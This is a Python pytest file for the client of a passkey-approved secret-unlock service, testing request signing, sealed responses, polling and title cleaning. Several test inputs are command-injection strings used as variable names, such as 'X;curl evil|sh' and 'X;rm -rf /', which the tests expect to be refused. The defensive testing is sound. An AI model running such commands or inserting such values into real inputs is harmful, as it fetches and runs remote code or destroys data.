from __future__ import annotations

import base64
import json
import socket
import urllib.error
import urllib.request
from pathlib import Path

import pytest
from conftest import REQUEST_TOKEN, REQUESTER, ed25519_keypair, opened, sealed_to, verified

from keyguard_passkey.service import client, requests
from keyguard_passkey.service.client import Caller, Cancelled, RequestGone, Signer, UnlockError, UnlockTimeout

BEARER = {"Authorization": f"Bearer {REQUEST_TOKEN}"}
PAGE_VECTORS = Path(__file__).parent / "unlock-core-vectors.json"
ED25519_PUBLIC_KEY_DER_PREFIX = bytes.fromhex("302a300506032b6570032100")
TITLE = "Rechnungstag f\u00fcr den Kunden \u2013 Entwurf"

pytestmark = pytest.mark.spec("docs/service.md")


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


@pytest.fixture
def signer(unlock_service):
    return Signer(key=unlock_service.signing_key, host=REQUESTER, now=lambda: 1)


@pytest.fixture
def submitted(unlock_service, signer):
    ephemeral = client.generate_ephemeral()
    return client.submit(unlock_service.base, BEARER, client.request_for(signer, ["A"], ephemeral.recipient))


def other_public_key(tmp_path):
    folder = tmp_path / "other"
    folder.mkdir()
    return ed25519_keypair(folder)[1]


def test_should_sign_a_payload_that_only_the_matching_public_key_verifies(unlock_service, tmp_path):
    signature = client.sign(b'{"a":1}', unlock_service.signing_key)

    assert verified(b'{"a":1}', signature, unlock_service.public_key)
    assert not verified(b'{"a":2}', signature, unlock_service.public_key)
    assert not verified(b'{"a":1}', signature, other_public_key(tmp_path))


def test_should_name_a_missing_signing_key(tmp_path):
    with pytest.raises(UnlockError, match="no signing key"):
        client.sign(b"body", tmp_path / "absent.key")


def test_should_decrypt_a_response_sealed_to_the_ephemeral_key():
    ephemeral = client.generate_ephemeral()
    values = {"A": "alpha", "B": "beta"}

    assert client.decrypt_response(sealed_to(ephemeral.recipient, values), ephemeral.identity, list(values)) == values


@pytest.mark.parametrize("answer, names", [
    ({"A": "alpha", "X;curl evil|sh": "y"}, ["A"]),
    ({"A": ["not", "a", "string"]}, ["A"]),
    ({"A": "alpha"}, ["A", "B"]),
], ids=["unasked name", "not a string", "missing name"])
def test_should_refuse_a_response_that_is_not_exactly_the_asked_values(answer, names):
    ephemeral = client.generate_ephemeral()

    with pytest.raises(UnlockError, match="exactly the requested names"):
        client.decrypt_response(sealed_to(ephemeral.recipient, answer), ephemeral.identity, names)


def test_should_refuse_a_response_it_cannot_decrypt():
    ephemeral, stranger = client.generate_ephemeral(), client.generate_ephemeral()

    with pytest.raises(UnlockError, match="could not decrypt"):
        client.decrypt_response(sealed_to(stranger.recipient, {"A": "x"}), ephemeral.identity, ["A"])


def test_should_refuse_a_response_that_is_not_base64():
    with pytest.raises(UnlockError, match="not base64"):
        client.decrypt_response("not base64!", client.generate_ephemeral().identity, ["A"])


def test_should_refuse_to_request_a_name_that_is_not_a_variable(signer):
    with pytest.raises(UnlockError, match="not valid variable names"):
        client.request_for(signer, ["JIRA_TOKEN", "X;rm -rf /"], "age1x")


def test_should_time_out_when_no_response_arrives(unlock_service, submitted):
    ticks = iter(range(100))

    with pytest.raises(UnlockTimeout):
        client.poll(unlock_service.base, BEARER, submitted, timeout=1, interval=0, now=lambda: next(ticks) * 0.5,
                    sleep=lambda _: None)


def test_should_stop_at_once_when_the_service_no_longer_holds_the_request(unlock_service):
    with pytest.raises(RequestGone):
        client.poll(unlock_service.base, BEARER, "never-created", timeout=60, interval=0,
                    sleep=lambda _: pytest.fail("kept polling a request that is gone"))


def test_should_stop_at_once_when_another_reader_collected_the_answer(unlock_service, submitted):
    unlock_service.call(f"/r/{submitted}/response", "POST", {"response": "sealed"})
    unlock_service.call(f"/r/{submitted}", headers=BEARER)

    with pytest.raises(RequestGone):
        client.poll(unlock_service.base, BEARER, submitted, timeout=60, interval=0,
                    sleep=lambda _: pytest.fail("kept polling a collected request"))


def test_should_stop_polling_once_the_request_is_cancelled(unlock_service, submitted):
    asked = iter([False, True])
    slept: list[float] = []

    with pytest.raises(Cancelled):
        client.poll(unlock_service.base, BEARER, submitted, timeout=60, interval=0, sleep=slept.append,
                    cancelled=lambda: next(asked))

    assert slept == [0]


def test_should_withdraw_a_request_so_the_phone_can_no_longer_load_it(unlock_service, submitted):
    client.withdraw(unlock_service.base, BEARER, submitted)

    with pytest.raises(urllib.error.HTTPError) as gone:
        unlock_service.approver_view(submitted)
    assert gone.value.code == 404


def test_should_accept_withdrawing_a_request_the_service_no_longer_holds(unlock_service):
    client.withdraw(unlock_service.base, BEARER, "never-created")


def test_should_report_a_withdrawal_the_service_refuses(unlock_service, submitted):
    with pytest.raises(client.ServiceRefused, match="403"):
        client.withdraw(unlock_service.base, {}, submitted)


def test_should_report_a_submission_the_service_refuses(unlock_service, signer):
    request = client.request_for(signer, ["A"], client.generate_ephemeral().recipient)

    with pytest.raises(client.ServiceRefused, match="403"):
        client.submit(unlock_service.base, {}, request)


@pytest.mark.parametrize("call", [
    lambda url: client.submit(url, BEARER, client.UnlockRequest(body={}, signature="s")),
    lambda url: client.poll(url, BEARER, "any", timeout=1),
    lambda url: client.withdraw(url, BEARER, "any"),
], ids=["submit", "poll", "withdraw"])
def test_should_report_a_service_that_is_unreachable(call):
    with pytest.raises(UnlockError, match="unreachable"):
        call(f"http://127.0.0.1:{free_port()}")


def test_should_report_a_service_that_stops_answering(monkeypatch):
    def time_out(*_args, **_kwargs):
        raise TimeoutError("timed out")

    monkeypatch.setattr(client.urllib.request, "urlopen", time_out)

    with pytest.raises(UnlockError, match="timed out"):
        client.poll("http://127.0.0.1:1", BEARER, "any", timeout=1)


def test_should_refuse_an_answer_from_the_service_that_is_not_a_json_object(monkeypatch):
    monkeypatch.setattr(client, "_send", lambda _request: b"[]")

    with pytest.raises(UnlockError, match="JSON object"):
        client.submit("http://127.0.0.1:1", BEARER, client.UnlockRequest(body={}, signature="s"))


def test_should_leave_a_field_forged_after_signing_unverifiable(unlock_service, signer):
    request = client.request_for(signer, ["A"], client.generate_ephemeral().recipient)
    forged = client.UnlockRequest(body={**request.body, "vars": ["B"]}, signature=request.signature)

    record = unlock_service.approver_view(client.submit(unlock_service.base, BEARER, forged))

    assert not unlock_service.signature_holds(record)


def test_should_seal_a_proposed_value_to_the_remote_key_only(unlock_service, signer):
    stranger = client.generate_ephemeral()

    request = client.set_request_for(signer, "JIRA_TOKEN", "new-value", client.generate_ephemeral().recipient,
                                     unlock_service.remote.recipient)

    assert (request.body["op"], request.body["vars"]) == ("set", ["JIRA_TOKEN"])
    assert opened(unlock_service.remote.identity, str(request.body["value"])) == "new-value"
    assert opened(stranger.identity, str(request.body["value"])) == ""


def test_should_sign_the_operation_and_the_sealed_value(unlock_service, signer):
    request = client.set_request_for(signer, "A", "v", client.generate_ephemeral().recipient,
                                     unlock_service.remote.recipient)
    swapped = {**request.body, "value": base64.b64encode(b"other").decode()}

    assert verified(client.serialize(request.body), request.signature, unlock_service.public_key)
    assert not verified(client.serialize(swapped), request.signature, unlock_service.public_key)


def test_should_name_a_remote_recipient_age_cannot_seal_to(signer):
    with pytest.raises(UnlockError, match="could not seal"):
        client.set_request_for(signer, "A", "v", "age1x", "not-a-recipient")


@pytest.mark.parametrize("build", [
    lambda signer: client.set_request_for(signer, "A;rm -rf ~", "v", "age1x", "age1y"),
    lambda signer: client.rm_request_for(signer, "A;rm", "age1x"),
], ids=["set", "rm"])
def test_should_refuse_to_change_a_name_that_is_not_a_variable(signer, build):
    with pytest.raises(UnlockError, match="not valid variable names"):
        build(signer)


@pytest.mark.parametrize("op", ["set", "rm"])
def test_should_accept_an_acknowledgement_for_the_proposed_name(op):
    ephemeral = client.generate_ephemeral()

    client.decrypt_ack(sealed_to(ephemeral.recipient, {op: "A"}), ephemeral.identity, op, "A")


@pytest.mark.parametrize("ack", [{"set": "B"}, {"set": "A", "extra": "x"}, {"A": "value"}, ["set", "A"],
                                 {"rm": "A"}])
def test_should_refuse_an_acknowledgement_that_is_not_exactly_the_proposed_name(ack):
    ephemeral = client.generate_ephemeral()

    with pytest.raises(UnlockError, match="did not confirm"):
        client.decrypt_ack(sealed_to(ephemeral.recipient, ack), ephemeral.identity, "set", "A")


def test_should_report_a_removal_of_a_name_the_store_lacks():
    ephemeral = client.generate_ephemeral()

    with pytest.raises(client.NotInStore, match="^A is not in the store$"):
        client.decrypt_ack(sealed_to(ephemeral.recipient, {"absent": ["A"]}), ephemeral.identity, "rm", "A")


def test_should_report_every_requested_name_the_store_lacks_in_the_asked_order():
    ephemeral = client.generate_ephemeral()

    with pytest.raises(client.NotInStore, match="^B, C are not in the store$") as absent:
        client.decrypt_response(sealed_to(ephemeral.recipient, {"absent": ["C", "B"]}), ephemeral.identity,
                                ["A", "B", "C"])
    assert absent.value.names == ["B", "C"]


@pytest.mark.parametrize("answer", [{"absent": ["X;curl evil|sh"]}, {"absent": []}, {"absent": "A"},
                                    {"absent": [["A"]]}, {"absent": ["A"], "A": "value"}])
def test_should_refuse_an_absent_answer_that_names_no_requested_variable(answer):
    ephemeral = client.generate_ephemeral()

    with pytest.raises(UnlockError) as raised:
        client.decrypt_response(sealed_to(ephemeral.recipient, answer), ephemeral.identity, ["A"])
    assert not isinstance(raised.value, client.NotInStore)


def test_should_refuse_an_absent_answer_to_a_proposed_value():
    ephemeral = client.generate_ephemeral()

    with pytest.raises(UnlockError) as raised:
        client.decrypt_ack(sealed_to(ephemeral.recipient, {"absent": ["A"]}), ephemeral.identity, "set", "A")
    assert not isinstance(raised.value, client.NotInStore)


def test_should_reveal_a_variable_that_happens_to_be_named_absent():
    ephemeral = client.generate_ephemeral()

    revealed = client.decrypt_response(sealed_to(ephemeral.recipient, {"absent": "value"}), ephemeral.identity,
                                       ["absent"])

    assert revealed == {"absent": "value"}


@pytest.mark.parametrize("build, op, names", [
    (lambda signer: client.rm_request_for(signer, "OLD_TOKEN", "age1eph"), "rm", ["OLD_TOKEN"]),
    (lambda signer: client.list_request_for(signer, "age1eph"), "list", []),
], ids=["rm", "list"])
def test_should_sign_a_removal_or_listing_that_carries_no_value(unlock_service, signer, build, op, names):
    request = build(signer)

    assert (request.body["op"], request.body["vars"]) == (op, names)
    assert "value" not in request.body
    assert verified(client.serialize(request.body), request.signature, unlock_service.public_key)


@pytest.mark.parametrize("listed, expected", [(["B_TOKEN", "A_TOKEN"], ["A_TOKEN", "B_TOKEN"]), ([], [])])
def test_should_return_the_listed_names_sorted(listed, expected):
    ephemeral = client.generate_ephemeral()

    assert client.decrypt_names(sealed_to(ephemeral.recipient, {"list": listed}), ephemeral.identity) == expected


@pytest.mark.parametrize("answer", [{"list": ["A", "X\x1b[2J"]}, {"list": "A"}, {"list": [1]},
                                    {"list": ["A"], "A": "value"}, {"A": "value"}, ["A"]])
def test_should_refuse_a_listing_that_is_not_a_list_of_variable_names(answer):
    ephemeral = client.generate_ephemeral()

    with pytest.raises(UnlockError, match="list of variable names"):
        client.decrypt_names(sealed_to(ephemeral.recipient, answer), ephemeral.identity)


def test_should_complete_the_list_flow_through_the_service(unlock_service, signer):
    ephemeral = client.generate_ephemeral()
    request_id = client.submit(unlock_service.base, BEARER, client.list_request_for(signer, ephemeral.recipient))

    assert unlock_service.signature_holds(unlock_service.approver_view(request_id))
    unlock_service.respond(request_id, {"list": ["JIRA_TOKEN", "GITHUB_TOKEN"]})
    response = client.poll(unlock_service.base, BEARER, request_id, timeout=5, interval=0.05)

    assert client.decrypt_names(response, ephemeral.identity) == ["GITHUB_TOKEN", "JIRA_TOKEN"]


def test_should_serialize_a_set_request_in_the_order_the_phone_verifies():
    body: client.Body = {"vars": ["A"], "host": "devbox", "eph_pubkey": "age1eph", "ts": 1, "op": "set",
                         "value": "c2VhbGVk"}

    assert client.serialize(body) == (b'{"eph_pubkey":"age1eph","host":"devbox","op":"set","ts":1,'
                                      b'"value":"c2VhbGVk","vars":["A"]}')


def test_should_sign_the_session_and_title_beside_the_request_fields(signer):
    request = client.request_for(signer, ["A"], "age1eph", Caller("48f92bcb", TITLE))

    assert (request.body["session"], request.body["title"]) == ("48f92bcb", TITLE)


def test_should_sign_no_session_fields_when_no_session_asks(signer):
    assert {"session", "title"}.isdisjoint(client.request_for(signer, ["A"], "age1eph").body)


def test_should_serialize_a_title_as_utf8_the_way_the_phone_rebuilds_it(signer):
    body = client.request_for(signer, ["A"], "age1eph", Caller("48f92bcb", TITLE)).body

    assert client.serialize(body) == (b'{"eph_pubkey":"age1eph","host":"devbox","session":"48f92bcb",'
                                      b'"title":"Rechnungstag f\xc3\xbcr den Kunden \xe2\x80\x93 Entwurf",'
                                      b'"ts":1,"vars":["A"]}')


@pytest.mark.parametrize("case", ["plain_request", "caller_request"])
def test_should_serialize_and_sign_the_requests_the_page_test_vectors_verify(case, tmp_path):
    vector = json.loads(PAGE_VECTORS.read_text(encoding="utf-8"))[case]
    body = {name: value for name, value in sorted(vector["request"].items(), reverse=True) if name != "sig"}
    public_key = tmp_path / "requester.pub"
    public_key.write_bytes(ED25519_PUBLIC_KEY_DER_PREFIX + base64.b64decode(vector["requester_pubkey_b64"]))

    assert base64.b64encode(client.serialize(body)).decode() == vector["canonical_signed_bytes_b64"]
    assert verified(client.serialize(body), vector["request"]["sig"], public_key)


@pytest.mark.parametrize("session, title, expected", [
    ("48f92bcb", "Keyguard approval session names", ("48f92bcb", "Keyguard approval session names")),
    ("G3yIYwxa", "t", ("G3yIYwxa", "t")),
    ("48f92bc", "t", ("", "t")),
    ("48f92bc!", "t", ("", "t")),
    ("48f92bcb-f080", "t", ("", "t")),
    ("48f92bcb", "  two\n\tlines  ", ("48f92bcb", "two lines")),
    ("48f92bcb", "bidi \u202e override\u200b", ("48f92bcb", "bidi override")),
    ("", "", ("", "")),
])
def test_should_keep_only_what_the_service_accepts(session, title, expected):
    found = client.caller(session, title)

    assert (found.session, found.title) == expected


def test_should_clip_a_long_title_with_an_ellipsis():
    clipped = client.clean_title("word " * 40)

    assert len(clipped) == requests.MAX_TITLE_CHARS
    assert clipped.endswith("\u2026")


@pytest.mark.parametrize("extra, expected", [
    (-1, "t" * (requests.MAX_TITLE_CHARS - 1)),
    (0, "t" * requests.MAX_TITLE_CHARS),
    (1, "t" * (requests.MAX_TITLE_CHARS - 1) + "\u2026"),
], ids=["one short", "exactly the limit", "one over"])
def test_should_keep_a_title_whole_up_to_the_limit(extra, expected):
    assert client.clean_title("t" * (requests.MAX_TITLE_CHARS + extra)) == expected


def test_should_carry_the_session_through_the_service_under_the_signature(unlock_service, signer):
    request = client.request_for(signer, ["A"], client.generate_ephemeral().recipient, Caller("48f92bcb", TITLE))

    record = unlock_service.approver_view(client.submit(unlock_service.base, BEARER, request))

    assert (record["session"], record["title"]) == ("48f92bcb", TITLE)
    assert unlock_service.signature_holds(record)
    assert not unlock_service.signature_holds({**record, "title": "Harmless chore"})


def test_should_offer_the_service_exactly_the_operations_it_accepts():
    assert {client.SET_OP, client.RM_OP, client.LIST_OP} == requests.REQUEST_OPS


def test_should_name_a_tool_missing_from_the_path(monkeypatch):
    monkeypatch.setenv("PATH", "/nonexistent")

    with pytest.raises(UnlockError, match="needs age-keygen on PATH"):
        client.generate_ephemeral()
